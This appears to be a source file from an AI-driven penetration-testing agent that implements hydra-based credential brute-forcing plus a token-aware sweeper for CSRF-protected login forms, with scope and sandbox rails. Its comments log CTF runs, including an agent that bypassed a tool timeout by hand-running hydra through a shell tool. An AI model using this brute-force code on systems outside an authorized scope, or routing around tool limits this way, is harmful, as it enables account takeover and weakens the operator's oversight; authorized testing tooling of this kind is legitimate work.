"""Durable ``nexus.cred.bruteforce`` handler: credential testing with hydra.

This is the credential link of the chain: it takes a **username** and a
**wordlist** (typically harvested from a previous recon step) and tests them
against a service, returning any validated credential. It is deliberately
generic — nothing about a specific target or room is hardcoded; the planner
decides when to call it and with which inputs.

Safety rails:

* the wordlist must live inside the workspace or inside a standard read-only
  wordlist root (``/usr/share/wordlists``, ``/usr/share/seclists``,
  ``/opt/seclists``; extend with ``NEXUS_WORDLIST_ROOTS``). Anything else is
  rejected as path traversal;
* ``http-post-form``/``http-get-form`` are first-class: hydra takes
  ``<form_url>:<form_params>:F=<failure_string>``, so a login page is testable
  without downloading hydra's own example files;
* the handler imposes no cap of its own: the wordlist runs to its end unless the
  caller passes ``max_attempts``/``timeout_seconds``, and the only ceilings are
  the tool's own contract (:data:`CRED_TOOL_TIMEOUT_SECONDS`), the run budget and
  the signed scope. What happened is reported as it is: a sweep that finished the
  list without a hit is ``negative`` and closes its branch, one cut by the budget
  is ``timeout`` and says so, and a missing ``hydra`` is ``unavailable`` (the
  target was never contacted) -never the other way around;
* hydra runs ``-f`` (stop at the first hit) and ``-I`` (ignore restore files),
  with a fixed low task count to be gentle on services; ``form_url`` takes a
  full URL as well as a bare path, because the model does not always know the
  difference (measured in Brute It, iteration 12). A query string
  (``/Account/login.aspx?ReturnURL=/admin/``) is dropped instead of rejected:
  ``?`` is structural in hydra's spec and the login does not need it to
  authenticate (run V13 against HackPark, 2026-10-21);
* ``form_params`` must carry ``^USER^``, but a missing ``^PASS^`` is filled in
  on the password field rather than refused: the run had the right WebForms
  fields and lost the sweep to a placeholder (V13, iteration 52);
* ``MEDIUM`` risk, scope-gated on ``target`` and executed through the sandbox.
* A validated password is **never returned**: it goes into the secret vault and
  the result carries ``secret_ref`` (V1-29). hydra prints the plaintext on stdout,
  so the returned capture is scrubbed too; the durable copy is the handler's own
  ``hydra.txt``, and the reusable one is the ``vault:<uuid>`` handle.
"""

from __future__ import annotations

import os
import tempfile
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlsplit

from nexus_core.kernel.errors import ToolInputError
from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import sandbox_for_environment
from nexus_core.kernel.secret_store import DEFAULT_SECRET_KIND, default_secret_store
from nexus_core.tools import wordlists as shared_wordlists

from ._exec import RECON_ALLOWED_PROGRAMS, run_in_sandbox, safe_run_id

CRED_ALLOWED_PROGRAMS = (*RECON_ALLOWED_PROGRAMS, "hydra")

#: Services hydra drives directly and the two web-form modules, which are the
#: measured hole: Brute It (2026-10-20) is an HTTP login, so the only brute-force
#: the run could do was SSH -three rockyou sweeps that were never the vector-.
CRED_SERVICES = ("ssh", "ftp", "telnet", "tcp", "http-post-form", "http-get-form")
#: hydra module names of the form services (the argv token, not our label).
CRED_FORM_SERVICES = ("http-post-form", "http-get-form")
CRED_DEFAULT_PORTS = {"ssh": 22, "ftp": 21, "telnet": 23,
                      "http-post-form": 80, "http-get-form": 80}
#: Turns an HTTP form login into hydra when the operator did not ask for SSL.
CRED_SSL_PORTS = (443, 8443)
#: Budget of the TCP script (``tcp``/``telnet``), which is not hydra.
CRED_DEFAULT_TIMEOUT_SECONDS = 300
#: Budget of the tool itself, published in its contract. The handler adds no
#: shorter one: the measured 60 s cap killed hydra mid-wordlist and the run read
#: the cut as "hydra is broken" (Brute It v5, iteration 13, 60.08 s). Containment
#: is the signed scope, the RoE, this contract and the run budget -never an
#: internal timer-, so a sweep runs until the wordlist ends or this budget does.
#: Run V13 against HackPark (2026-10-21) asked for a 1 200 s sweep and the
#: contract refused it at 900, so the run dropped to a hand-written ``hydra``
#: through ``nexus.shell.exec`` and spent five turns there. The ceiling now
#: matches the other long-running tools (``nmap``, ``nikto``, ``gobuster``):
#: 1 800 s, still a ceiling the operator can see in the contract.
CRED_TOOL_TIMEOUT_SECONDS = 1800
#: The sweep stops a few seconds before the contract does, so the *handler* -not
#: the gateway's ``wait_for``- answers ``timeout`` with the wordlist progress in
#: the message. Those seconds belong to reporting, not to hydra.
CRED_TIMEOUT_MARGIN_SECONDS = 15
CRED_SWEEP_TIMEOUT_SECONDS = CRED_TOOL_TIMEOUT_SECONDS - CRED_TIMEOUT_MARGIN_SECONDS

#: Read-only roots a wordlist may also live in. The rail exists to stop path
#: traversal into arbitrary files, not to force every engagement to copy
#: rockyou into its workspace: measured in run_1052d63f9bba4838902b3aa21bd27d21
#: (2026-10-19), where ``/usr/share/wordlists/rockyou.txt`` was rejected twice
#: and the credential branch -the only one left once the SQLi was closed- died
#: there. ``NEXUS_WORDLIST_ROOTS`` (``os.pathsep``-separated) extends the list.
#: A root that is not installed on this host is ignored by the resolver instead
#: of being advertised: Brute It v6 (2026-10-20) asked twice for a
#: ``/usr/share/seclists`` path that does not exist on the operator's Kali.
WORDLIST_ROOTS_ENV = "NEXUS_WORDLIST_ROOTS"
DEFAULT_WORDLIST_ROOTS = ("/usr/share/wordlists", "/usr/share/seclists", "/opt/seclists")

#: Words a slice tests when the caller does not say. A full ``rockyou`` sweep
#: took 890 s and was killed by the loop before answering anything (Brute It v7,
#: iteration 16), so a call now tests a bounded slice by default and reports the
#: offset the next one starts at. 5 000 is what a local form login walks in
#: ~80 s (measured in the same run, iteration 20).
CRED_DEFAULT_MAX_ATTEMPTS = 5000
#: One known-bad credential, used to learn what a *failed* login looks like
#: before spending the wordlist on it.
CRED_PROBE_USER_FALLBACK = "admin"
CRED_PROBE_PASSWORD = "invalid_probe_12345"
#: Budget of the probe: two requests, no sweep.
CRED_PROBE_TIMEOUT_SECONDS = 20

#: Hidden inputs that mean "this POST needs a token Hydra cannot refresh". The
#: names cover ASP.NET WebForms, ASP.NET MVC, Rails, Django, Joomla and the
#: generic ``csrf``/``_token`` spellings. A hidden ``return_url`` does not match.
CRED_CSRF_FIELD_RE = re.compile(
    r"(__viewstate|__eventvalidation|__requestverificationtoken|authenticity_token|_token|csrf)",
    re.IGNORECASE,
)
#: Concurrent hydra tasks. Kept low to avoid tripping service rate limits.
CRED_TASKS = 4

#: Successful hydra line, e.g.
#: ``[22][ssh] host: 1.2.3.4   misc: (null)   login: lin   password: p``.
#: Hydra may inject extra fields (``misc``) between host and login, so the
#: match tolerates arbitrary fields in between.
_FOUND_RE = re.compile(
    r"host:\s*(?P<host>\S+).*?login:\s*(?P<user>\S+)\s+password:\s*(?P<password>\S+)"
)


def cred_bruteforce_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.cred.bruteforce``."""
    return ToolDefinition(
        tool_id="nexus.cred.bruteforce",
        effect="credential_access",
        name="Credential testing",
        tenant_id=tenant_id,
        description=(
            "Prueba un usuario contra una wordlist en un servicio (ssh/ftp) o "
            "contra un formulario web (http-post-form/http-get-form) y devuelve "
            "la credencial válida. La wordlist debe estar en el workspace del "
            "engagement o en una ruta estándar (/usr/share/wordlists, "
            "/usr/share/seclists)."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "target": {"type": "string", "minLength": 1, "maxLength": 255},
                "service": {"type": "string", "enum": list(CRED_SERVICES)},
                "username": {"type": "string", "minLength": 1, "maxLength": 128},
                "password_prompt": {"type": "string", "minLength": 1, "maxLength": 128},
                "login_prompt": {"type": "string", "minLength": 1, "maxLength": 128},
                "success_marker": {"type": "string", "minLength": 1, "maxLength": 128},
                # The three fields of hydra's form modules: the path of the
                # handler, the body template with ``^USER^``/``^PASS^`` and the
                # text that marks a failed login.
                "form_url": {"type": "string", "minLength": 1, "maxLength": 512},
                "form_params": {"type": "string", "minLength": 1, "maxLength": 512},
                "failure_string": {"type": "string", "minLength": 1, "maxLength": 200},
                # Hydra cannot re-fetch a page per attempt, so a form protected by
                # an ASP.NET __VIEWSTATE/__EVENTVALIDATION token (or any CSRF
                # token) can never be swept by it: every POST is rejected before
                # the credential is even tested. ``csrf_mode`` runs the same form
                # sweep with the embedded client instead, fetching the tokens for
                # every attempt.
                "csrf_mode": {
                    "type": "boolean",
                    "description": (
                        "Para formularios con token anti-CSRF (ASP.NET WebForms, "
                        "Django, Rails, Joomla): barrido nativo que hace GET de la "
                        "página en cada intento, extrae los <input type=hidden> y "
                        "los inyecta en el POST. Con esto activo no se usa Hydra."
                    ),
                },
                "csrf_form_url": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 2048,
                    "description": (
                        "URL (o ruta) de la página del formulario para el GET de "
                        "csrf_mode cuando no coincide con target+form_url."
                    ),
                },
                # One known-bad login before the sweep. It stops the run from
                # spending its budget on a marker that cannot identify a failure
                # (Brute It v6, iteration 8: 600 s with ``F=LOGIN``).
                "probe": {"type": "boolean"},
                "password_file": {"type": "string", "minLength": 1, "maxLength": 1024},
                "port": {"type": "integer", "minimum": 1, "maximum": 65535},
                # A bounded slice by default (Brute It v7: an unbounded rockyou
                # sweep ran 890 s and was cut by the loop). The cap is a *slice*,
                # not a ceiling: the next call starts at ``next_start_at``, and
                # an operator can still pass a bigger ``max_attempts``.
                "max_attempts": {
                    "type": "integer",
                    "minimum": 1,
                    "default": CRED_DEFAULT_MAX_ATTEMPTS,
                    "description": (
                        f"Entradas de la wordlist a probar en esta llamada "
                        f"(por defecto {CRED_DEFAULT_MAX_ATTEMPTS})."
                    ),
                },
                "start_at": {
                    "type": "integer",
                    "minimum": 0,
                    "default": 0,
                    "description": (
                        "Offset de la wordlist donde empieza esta llamada "
                        "(usa el `next_start_at` del resultado `partial`)."
                    ),
                },
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 10,
                    "maximum": CRED_TOOL_TIMEOUT_SECONDS,
                },
            },
            # ``username`` is required by the ssh/ftp branch at runtime, and the
            # schema is the contract the model reads: reject it there instead of
            # spending a turn on ``username is required`` (measured twice in
            # run_7661dda481784eebb17a76e037c5722b).
            "allOf": [
                {
                    "if": {"properties": {"service": {"enum": ["ssh", "ftp"]}}},
                    "then": {"required": ["username"]},
                },
                {
                    "if": {"properties": {"service": {"enum": list(CRED_FORM_SERVICES)}}},
                    "then": {
                        "required": [
                            "username",
                            "form_url",
                            "form_params",
                            "failure_string",
                        ]
                    },
                },
            ],
            "required": ["target", "service", "password_file"],
            "additionalProperties": False,
        },
        risk=RiskLevel.MEDIUM,
        required_permissions=["execute:tool:nexus.cred.bruteforce"],
        timeout_seconds=CRED_TOOL_TIMEOUT_SECONDS,
        max_output_bytes=2_000_000,
        scope_target_field="target",
        scope_required=True,
    )


def _validate_text(value: Any, field: str, *, max_length: int) -> str:
    text = str(value or "").strip()
    if not text:
        raise ToolInputError(f"{field} is required")
    if len(text) > max_length:
        raise ToolInputError(f"{field} is too long")
    if any(ord(ch) < 0x20 for ch in text):
        raise ToolInputError(f"{field} contains control characters")
    return text


def _wordlist_roots(workspace_root: str) -> list[str]:
    """Roots a wordlist may be read from: the workspace plus the installed ones."""
    roots = [os.path.realpath(workspace_root)]
    configured = [
        item.strip()
        for item in os.getenv(WORDLIST_ROOTS_ENV, "").split(os.pathsep)
        if item.strip()
    ]
    roots.extend(shared_wordlists.existing_roots(configured or DEFAULT_WORDLIST_ROOTS))
    return [root for index, root in enumerate(roots) if root not in roots[:index]]


def _resolve_wordlist(workspace_root: str, source: str) -> str:
    """Resolve ``source`` under an allowed wordlist root or raise ``ToolInputError``.

    The containment rules live in :mod:`nexus_core.tools.wordlists`, shared with
    ``ffuf``/``gobuster``: an absolute path is accepted when it is inside the
    workspace or a system root (Kali installs 12 of its 13 wordlists as
    symlinks pointing outside ``/usr/share/wordlists``, and only root can plant
    one there), and a relative name is looked up in the workspace first and then
    in the system roots.

    The two failures are named separately because they need two reactions:
    ``file does not exist`` (pick another list) and ``forbidden path`` (that one
    may not be read). Brute It v6 got one generic message for both and retried
    the missing one until the run was blocked.
    """
    text = str(source or "").strip()
    roots = _wordlist_roots(workspace_root)
    try:
        return shared_wordlists.resolve_wordlist(
            workspace_root, text, system_roots=roots[1:], label="password_file"
        )
    except shared_wordlists.WordlistNotFound as exc:
        raise ToolInputError(f"file does not exist: {exc.path}") from exc
    except shared_wordlists.WordlistForbidden as exc:
        raise ToolInputError(f"forbidden path: {exc.path}") from exc


def _truncate_wordlist(
    source: str, dest: str, max_attempts: int | None, start_at: int = 0
) -> tuple[int, bool]:
    """Copy one slice of ``source`` into ``dest``; return ``(count, exhausted)``.

    ``start_at`` skips that many non-empty entries (the ``next_start_at`` of a
    previous ``partial`` call) and ``max_attempts`` bounds the slice. ``None``
    still means *the whole list*. ``exhausted`` says whether this slice reached
    the end of the file, which is the difference between "there is no more list"
    and "there is another slice": only the former is a verdict about the target.

    The copy is streamed, so the size of the source is not work and the old
    16 MB ceiling (which rejected the one list an operator always has, measured
    in ``run_7661dda481784eebb17a76e037c5722b``) stays gone.
    """
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    count = 0
    skipped = 0
    exhausted = True
    with open(source, encoding="utf-8", errors="replace") as reader, open(
        dest, "w", encoding="utf-8"
    ) as writer:
        while line := reader.readline(4097):
            if len(line) > 4096:
                raise ToolInputError("wordlist entry exceeds 4096 characters")
            token = line.rstrip("\r\n")
            if not token:
                continue
            if skipped < start_at:
                skipped += 1
                continue
            if max_attempts is not None and count >= max_attempts:
                # The next line is a *new* entry: the slice ended, the list did
                # not, so the caller can ask for the next one.
                exhausted = False
                break
            writer.write(token + "\n")
            count += 1
    return count, exhausted


def store_discovered_credentials(
    credentials: list[dict[str, Any]],
    *,
    tenant_id: str = "system",
    kind: str = DEFAULT_SECRET_KIND,
) -> list[dict[str, str]]:
    """Replace every plaintext password with its ``secret_ref`` (V1-29).

    The plaintext is written once into the vault; what travels onward (result,
    evidence, blackboard, prompt) is the reference. A credential without a
    password (an access-token flow) keeps its fields untouched.
    """
    stored: list[dict[str, str]] = []
    vault = default_secret_store()
    for credential in credentials or ():
        entry = {str(key): str(value) for key, value in credential.items()}
        password = entry.pop("password", "")
        if password:
            entry["secret_ref"] = vault.put(
                password.encode("utf-8"), kind=kind, tenant_id=tenant_id
            )
        stored.append(entry)
    return stored


def _scrub_plaintext(text: str, credentials: list[dict[str, Any]]) -> str:
    """Remove the validated passwords from a raw capture before returning it."""
    cleaned = text or ""
    for credential in credentials or ():
        password = str((credential or {}).get("password") or "")
        if password:
            cleaned = cleaned.replace(password, "[REDACTED]")
    return cleaned


def parse_hydra_credentials(text: str) -> list[dict[str, str]]:
    """Extract validated credentials from hydra's output (stdout/stderr/file)."""
    found: list[dict[str, str]] = []
    for match in _FOUND_RE.finditer(text or ""):
        credential = {
            "host": match.group("host"),
            "username": match.group("user"),
            "password": match.group("password"),
        }
        if credential not in found:
            found.append(credential)
    return found


#: Shapes that mean *hydra never ran*: the binary is absent, its loader is
#: broken or the container runtime is not serving. A sweep that ran and found
#: nothing is **not** here -measured in Brute It v5 (iterations 15 and 20), a
#: finished SSH sweep was reported ``unavailable``, the model concluded hydra was
#: broken and went back to hand-written SQLi. The two verdicts are different
#: facts and the agent acts differently on each.
_HYDRA_MISSING_MARKERS = (
    "command not found",
    "hydra: not found",
    "error while loading shared libraries",
    "cannot connect to the docker daemon",
    "docker: not found",
    "exec format error",
)


def _hydra_unavailable(exit_code: int | None, stderr: str) -> bool:
    """Whether hydra itself never started (``unavailable``), not a failed sweep."""
    if exit_code == 127:
        return True
    text = (stderr or "").lower()
    return any(marker in text for marker in _HYDRA_MISSING_MARKERS)


def _hydra_verdict(text: str) -> str:
    """hydra's own closing line, so the agent reads *why* there was no hit.

    ``0 valid password found`` is a finished sweep; ``[ERROR] ...`` is hydra
    saying it could not do its job (refused connection, no password auth). Both
    are reported under ``negative`` -nothing was validated- but the model needs
    the words to choose the next vector instead of retrying the same sweep.
    """
    lines = [line.strip() for line in (text or "").splitlines() if line.strip()]
    for line in reversed(lines):
        lowered = line.lower()
        if "password found" in lowered or lowered.startswith("[error]"):
            return line[:300]
    return lines[-1][:300] if lines else ""


#: Schemes a full ``form_url`` may carry; anything else is a modelling slip.
_FORM_URL_SCHEMES = ("http", "https")


def _host_key(value: Any) -> str:
    """Host part of ``value``, so ``host`` and ``http://host/`` compare equal."""
    text = str(value or "").strip().lower()
    if "://" in text:
        return str(urlsplit(text).hostname or "")
    return text.split("/", 1)[0]


def _normalize_form_url(value: Any) -> tuple[str, str, int | None, bool]:
    """Return ``(path, host, port, secure)`` from a bare path or a full URL.

    The model does not always know the difference: measured in Brute It v5
    (2026-10-20, iteration 12) it passed ``form_url="http://10.67.149.76/admin/"``
    and the handler answered ``form_url must be the login path``, costing a turn.
    A URL already carries the three facts the hydra spec needs -route, host and
    TLS-, so they are taken from it instead of rejected. A *bare* path keeps the
    strict checks: only the scheme is peeled off here, never the safety rules.
    """
    text = _validate_text(value, "form_url", max_length=512)
    host, port, secure = "", None, False
    if "://" in text:
        scheme = text.partition("://")[0].strip().lower()
        if scheme not in _FORM_URL_SCHEMES:
            raise ToolInputError(
                "form_url must be the login path ('/admin/') or an http/https URL"
            )
        parts = urlsplit(text)
        host = str(parts.hostname or "")
        try:
            port = parts.port
        except ValueError as exc:  # ``http://host:notaport/``
            raise ToolInputError("form_url carries an invalid port") from exc
        secure = scheme == "https"
        path = parts.path or "/"
    else:
        path = text
    # A query string is dropped, not rejected (V13/HackPark, 2026-10-21): the
    # model passed ``/Account/login.aspx?ReturnURL=/admin/`` and the handler
    # answered with an error, so the run improvised outside the tool. ``?`` is
    # structural in hydra's spec, and an ASP.NET login authenticates from the
    # form body, not from the return URL. The fragment goes for the same reason.
    path = path.split("?", 1)[0].split("#", 1)[0] or "/"
    if not path.startswith("/"):
        path = "/" + path
    return path, host, port, secure


#: Characters hydra treats as structure inside its single argv token: ``:``
#: separates its conditions (``C=``, ``H=``, ``S=``) and ``?`` starts a query,
#: so neither may appear in a form body. Everything else is a legal field name.
_FORM_PARAM_STRUCTURAL_CHARS = (":", "?")


def _validate_form_params(params: str) -> None:
    """Accept any field name hydra can carry, reject only what breaks the spec.

    The previous rule banned ``:`` **and whitespace**, which rejected the names
    a real ASP.NET WebForms panel posts -
    ``ctl00$MainContent$LoginUser$UserName``- with *"form_params must not
    contain ':' or whitespace"* (run V11 against HackPark, 2026-10-21: the run had
    the three fields, the user and the wordlist, and the validator refused the
    login). ``$``, ``_``, ``-``, ``[]`` and spaces are ordinary body characters:
    the token is one ``argv`` element, so a space never reaches a shell either.

    What remains is the only thing hydra actually parses: ``:`` and ``?`` are
    rejected anywhere, and every ``&``-separated segment must be ``name=value``
    (an empty name or a dangling ``&&`` would send a nameless field).
    """
    for char in _FORM_PARAM_STRUCTURAL_CHARS:
        if char in params:
            raise ToolInputError(
                "form_params must not contain ':' or '?' (hydra parses them as "
                "conditions/query); field names with '$', '_', '-', spaces or "
                "brackets are accepted"
            )
    for segment in params.split("&"):
        name, separator, _value = segment.partition("=")
        if not separator or not name.strip():
            raise ToolInputError(
                f"form_params must be 'name=value' pairs joined by '&': {segment!r} "
                "has no field name"
            )


#: Field names that mean "this is the password field" in the forms measured so
#: far (ASP.NET WebForms, PHP panels, Django, Joomla). Used only to place
#: ``^PASS^`` when the caller forgot it; it never rewrites a field hydra would
#: have posted verbatim.
CRED_PASSWORD_FIELD_RE = re.compile(
    r"(pass|pwd|clave|contrasen|contraseñ|secret)", re.IGNORECASE
)
#: Field a missing ``^PASS^`` falls back to when no password-like name exists.
CRED_PASSWORD_FALLBACK_FIELD = "pass"


def _ensure_password_placeholder(params: str) -> tuple[str, str]:
    """Return ``(params, note)`` with hydra's ``^PASS^`` placeholder present.

    Run V13 against HackPark (2026-10-21, iteration 52) sent the three WebForms
    fields with ``^USER^`` and an empty ``$Password=``, and the handler refused
    the sweep for the missing placeholder -the run then hand-rolled hydra through
    ``nexus.shell.exec``-. Hydra cannot test a wordlist without ``^PASS^``, so the
    empty password field is filled instead of refused.

    The substitution is reported in ``note`` (and in the evidence) so the result
    never looks like the caller wrote it. When no field matches and there is no
    ``^USER^`` either, the params are returned untouched: that is not a login
    description, and :func:`_form_spec` rejects it with the right message.
    """
    if "^PASS^" in params or "^USER^" not in params:
        return params, ""
    segments = params.split("&")
    for index, segment in enumerate(segments):
        name, separator, value = segment.partition("=")
        if separator and CRED_PASSWORD_FIELD_RE.search(name) and not value.strip():
            segments[index] = f"{name}=^PASS^"
            return "&".join(segments), f"{name}=^PASS^"
    segments.append(f"{CRED_PASSWORD_FALLBACK_FIELD}=^PASS^")
    return "&".join(segments), f"{CRED_PASSWORD_FALLBACK_FIELD}=^PASS^"


def _form_spec(form_url: Any, form_params: Any, failure_string: Any) -> str:
    """Build hydra's ``<path>:<params>:F=<failure>`` spec from validated parts.

    ``form_url`` is the route already normalized by :func:`_normalize_form_url`.
    hydra splits that one argv token on ``:``, so a value carrying one would
    silently become a fourth condition (``C=``, ``H=``, ``S=``): the model could
    smuggle a header or a command through the login form. Every part is therefore
    rejected if it contains ``:``, and the placeholders are required because a
    body without ``^USER^``/``^PASS^`` tests the same request N times and calls
    the resulting silence a negative verdict.
    """
    path = _validate_text(form_url, "form_url", max_length=512)
    if not path.startswith("/"):
        raise ToolInputError("form_url must be the login path, starting with '/'")
    if ":" in path or any(char.isspace() for char in path):
        raise ToolInputError("form_url must not contain ':' or whitespace")
    params = _validate_text(form_params, "form_params", max_length=512)
    if "^USER^" not in params or "^PASS^" not in params:
        raise ToolInputError(
            "form_params must carry hydra's placeholders, e.g. "
            "'user=^USER^&pass=^PASS^&submit=Login'"
        )
    _validate_form_params(params)
    failure = _validate_text(failure_string, "failure_string", max_length=200)
    if ":" in failure:
        raise ToolInputError(
            "failure_string must not contain ':' (it separates hydra's conditions)"
        )
    return f"{path}:{params}:F={failure}"


#: The probe hydra cannot do: hydra only knows "the failure string is here or it
#: is not", so it cannot tell that the string it was given also appears on the
#: login page itself. This client makes the two observations the verdict needs -
#: the page as an anonymous visitor (`baseline`) and the page after one known-bad
#: POST (`failure`)- and reports whether the needle is in each.
#:
#: Measured in Brute It v6 (2026-10-20, iteration 8): ``failure_string="LOGIN"``
#: against a panel whose button already says ``Login`` burned the whole 600 s
#: tool budget and could not have reported a hit, because the marker was present
#: in both branches. The run never learned what a failed login looks like, so the
#: next turns guessed (SSH, SQLi) instead of sweeping again.
CRED_PROBE_SCRIPT = r'''
import json, sys, urllib.error, urllib.parse, urllib.request
from html.parser import HTMLParser

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    # A login answers 302 *with* the Set-Cookie. Following it silently kept only
    # the final page's headers, so a panel that redirects to /admin/panel/ looked
    # like it never set a session (this was the first E2E of the capture).
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

OPENER = urllib.request.build_opener(_NoRedirect())

def _cookies(headers):
    return [str(value) for value in (headers.get_all("Set-Cookie") or [])] if headers else []

class _Hidden(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.names = []
    def handle_starttag(self, tag, attrs):
        values = {key.lower(): (value if value is not None else "") for key, value in attrs}
        if tag.lower() == "input" and values.get("name"):
            if values.get("type", "").lower() == "hidden":
                self.names.append(values["name"])

def hidden_names(page):
    parser = _Hidden()
    parser.feed(page or "")
    return parser.names

def fetch(url, method, body, timeout, cookie=None):
    data = body.encode("utf-8") if body else None
    request = urllib.request.Request(url, data=data, method=method)
    request.add_header("User-Agent", "nexus-cred-probe/1")
    if cookie:
        request.add_header("Cookie", cookie)
    if data is not None:
        request.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with OPENER.open(request, timeout=timeout) as response:
            return (response.getcode(),
                    response.read(200000).decode("utf-8", "replace"),
                    _cookies(response.headers),
                    response.headers.get("Location") or "")
    except urllib.error.HTTPError as exc:
        headers = getattr(exc, "headers", None)
        return (exc.code,
                exc.read(200000).decode("utf-8", "replace"),
                _cookies(headers),
                (headers.get("Location") if headers else "") or "")

def main():
    baseline_url, method, action_url, body, needle, timeout = sys.argv[1:7]
    limit = float(timeout)
    baseline_status, baseline, _, baseline_location = fetch(baseline_url, "GET", "", limit)
    # The page itself tells whether it is a token-protected form: if every POST
    # needs a fresh __VIEWSTATE/CSRF value, Hydra cannot sweep it and the handler
    # must switch to its token-aware client (run V10, HackPark, 2026-10-21).
    try:
        hidden_fields = hidden_names(baseline)
    except Exception:
        hidden_fields = []
    if baseline_location and 300 <= baseline_status < 400:
        # The anonymous page redirects to the real login form: that page is the
        # baseline the marker must *not* be in.
        _, landed_baseline, _, _ = fetch(
            urllib.parse.urljoin(baseline_url, baseline_location), "GET", "", limit
        )
        baseline += "\n" + landed_baseline
        try:
            hidden_fields = hidden_names(landed_baseline)
        except Exception:
            hidden_fields = hidden_fields
    failure_status, failure, set_cookie, location = fetch(action_url, method, body, limit)
    landed_status = failure_status
    if location and 300 <= failure_status < 400:
        # One hop, only to read the marker: the rejected-login text usually
        # lives on the page the app redirects to, and the cookie stays the one
        # the login itself answered with.
        cookie_header = "; ".join(
            value.split(";", 1)[0].strip() for value in set_cookie if "=" in value
        )
        target_url = urllib.parse.urljoin(action_url, location)
        landed_status, landed, _, _ = fetch(target_url, "GET", "", limit, cookie_header)
        failure = failure + "\n" + landed
        failure_status = landed_status
    print(json.dumps({
        "ok": True,
        "baseline_status": baseline_status,
        "failure_status": failure_status,
        "in_baseline": needle in baseline,
        "in_failure": needle in failure,
        "hidden_fields": hidden_fields,
        "baseline_len": len(baseline),
        "failure_len": len(failure),
        # The session the login just opened. Hydra validates the *password*; a
        # panel then hands out a cookie, and without it the winning credential
        # cannot be used anywhere (Brute It v7, iteration 22: the agent had
        # ``vault:443a…`` and no way to authenticate the panel).
        "set_cookie": set_cookie,
    }))

try:
    main()
except Exception as exc:
    print(json.dumps({"ok": False, "error": type(exc).__name__ + ": " + str(exc)[:200]}))
'''


#: The sweep hydra cannot do: a form that renders a fresh token per attempt.
#:
#: ``mode=probe`` performs the same two observations as ``CRED_PROBE_SCRIPT``
#: (anonymous page vs one known-bad POST) but *through* the token flow, so the
#: failure marker is validated against the request the sweep will actually make.
#: ``mode=sweep`` walks the sliced wordlist, fetching the form and its hidden
#: inputs for every password. Requests are sequential on purpose: ASP.NET ties
#: the viewstate (and often the session) to the GET that issued it, and parallel
#: attempts with a shared cookie jar would invalidate each other's tokens.
CRED_CSRF_SCRIPT = r'''
import http.client, json, sys, time, urllib.error, urllib.parse, urllib.request
from html.parser import HTMLParser

# Progress shared with the top-level handler so an unexpected abort can still
# report how much of the slice was really tested (R4).
_PROGRESS = {"tested": 0, "request_timeouts": 0, "started": 0.0}

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    allow_same_origin = False
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if self.allow_same_origin:
            old, new = urllib.parse.urlsplit(req.full_url), urllib.parse.urlsplit(newurl)
            if (old.scheme, old.hostname, old.port) == (new.scheme, new.hostname, new.port):
                return super().redirect_request(req, fp, code, msg, headers, newurl)
        return None

def _opener(follow):
    handler = _NoRedirect()
    handler.allow_same_origin = follow
    return urllib.request.build_opener(handler)

class _Hidden(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.fields = []
    def handle_starttag(self, tag, attrs):
        values = {key.lower(): (value if value is not None else "") for key, value in attrs}
        if tag.lower() == "input" and values.get("name"):
            if values.get("type", "").lower() == "hidden":
                self.fields.append((values["name"], values.get("value", "")))

def hidden_fields(page):
    parser = _Hidden()
    parser.feed(page or "")
    return parser.fields

def _set_cookies(headers):
    return [str(value) for value in (headers.get_all("Set-Cookie") or [])] if headers else []

def fetch(url, method, body, timeout, jar, follow):
    data = body.encode("utf-8") if body else None
    request = urllib.request.Request(url, data=data, method=method)
    request.add_header("User-Agent", "nexus-csrf-form/1")
    if jar:
        request.add_header("Cookie", "; ".join("%s=%s" % item for item in jar.items()))
    if data is not None:
        request.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with _opener(follow).open(request, timeout=timeout) as response:
            status = response.getcode()
            text = response.read(300000).decode("utf-8", "replace")
            cookies = _set_cookies(response.headers)
            location = response.headers.get("Location") or ""
    except urllib.error.HTTPError as exc:
        status = exc.code
        text = exc.read(300000).decode("utf-8", "replace")
        cookies = _set_cookies(getattr(exc, "headers", None))
        location = (exc.headers.get("Location") if exc.headers else "") or ""
        exc.close()
    for raw in cookies:
        first = raw.split(";", 1)[0].strip()
        name, separator, value = first.partition("=")
        if separator and name:
            jar[name.strip()] = value.strip()
    return status, text, location

def fill(template, username, password, hidden):
    pairs = urllib.parse.parse_qsl(
        template.replace("^USER^", username).replace("^PASS^", password),
        keep_blank_values=True,
    )
    present = set(name for name, _ in pairs)
    pairs.extend((name, value) for name, value in hidden if name not in present)
    return urllib.parse.urlencode(pairs)

def attempt(form_url, method, action_url, template, username, password, timeout, jar):
    status, page, _ = fetch(form_url, "GET", "", timeout, jar, True)
    hidden = hidden_fields(page)
    body = fill(template, username, password, hidden)
    if method == "GET":
        target = action_url + ("&" if "?" in action_url else "?") + body
        status, text, location = fetch(target, "GET", "", timeout, jar, False)
    else:
        status, text, location = fetch(action_url, "POST", body, timeout, jar, False)
    if 300 <= status < 400 and location:
        landed_status, landed, _ = fetch(
            urllib.parse.urljoin(action_url, location), "GET", "", timeout, jar, False
        )
        text = text + "\n" + landed
        status = landed_status
    return status, text, hidden

#: Consecutive request failures after which the sweep stops instead of walking
#: the rest of a wordlist against a target that is not answering.
MAX_CONSECUTIVE_REQUEST_TIMEOUTS = 10
#: Retries of one *entry* whose request was cut. One slow or reset connection is
#: not evidence about the password, so the same password is tried again before it
#: counts as lost (V12 lost the whole slice to a single timeout).
REQUEST_RETRIES = 1

def _write(path, payload):
    try:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(json.dumps(payload) + "\n")
    except OSError:
        pass

def main():
    (mode, form_url, method, action_url, template, failure, username, wordlist,
